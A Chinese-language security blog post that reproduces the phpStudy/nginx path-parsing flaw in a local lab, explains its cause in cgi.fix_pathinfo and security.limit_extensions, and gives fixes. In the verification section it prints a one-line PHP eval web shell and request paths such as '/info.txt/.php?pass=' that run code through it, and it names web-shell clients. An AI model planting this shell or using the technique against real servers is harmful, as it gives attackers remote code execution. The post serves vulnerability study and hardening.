---
title: phpstudy_nginx解析漏洞验证
tags:
  - phpstudy
categories:
  - 安全
copyright: true
permalink: phpstudy_nginx解析漏洞验证
top: 0
password: 
abstract: 输入密码继续阅读.
message: 欢迎来到我的博客，输入密码继续阅读.
date: 2020-09-03 21:09:05
---

## 一、环境搭建

去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。

<!--more-->
## 二、验证漏洞

上传文件 info.txt到www目录，保证能够解析
```
<?php 
@eval($_GET["pass"]);
?>
```
访问127.0.0.1/info.txt看到文件存在
访问127.0.0.1/info.txt/.php?pass=phpinfo(); 看到info信息
访问127.0.0.1/info.txt/.php 连接菜刀
或上传冰蝎码.
访问127.0.0.1/shell.png/.php?pass=phpinfo();

## 三、原理分析

这个漏洞是nginx的配置，windows存在这个问题，linux不存在这个问题

1.由于nginx.conf的如下配置导致nginx把以'.php'结尾的文件交给fastcgi处理,为此可以构造http://ip/uploadfiles/test.png/.php (url结尾不一定是'.php',任何服务器端不存在的php文件均可,比如'a.php'),其中test.png是我们上传的包含PHP代码的照片文件。

2、但是fastcgi在处理'.php'文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了'/test.png’。

3、最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将'.png'等文件当做代码解析。
在nginx默认配置中，有一个解析php的路由

```
       #location ~ \.php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php7.0-cgi alone:
        #       fastcgi_pass 127.0.0.1:9000;
        #       # With php7.0-fpm:
        #       fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        #}
```
## 四、修复
1、将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面


2、php-fpm.conf中的security.limit_extensions后面的值设置为.php
## 参考
http://wechat.doonsec.com/article/?id=1632d9b3b7f94ead41c575e12b1a3aff
